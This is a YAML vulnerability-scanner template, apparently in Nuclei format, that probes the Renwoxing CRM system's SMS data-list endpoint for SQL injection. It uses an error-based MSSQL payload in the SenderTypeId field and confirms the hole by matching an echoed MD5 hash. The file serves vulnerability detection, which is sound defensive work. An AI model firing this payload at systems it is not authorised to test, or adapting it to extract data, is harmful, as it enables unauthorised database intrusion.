id: poc-yaml-renwoxing-CRM-system-SQL-injection
info:
  name: 任我行CRM系统SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1,100)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}')))) AND 'CvNI'='CvNI
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
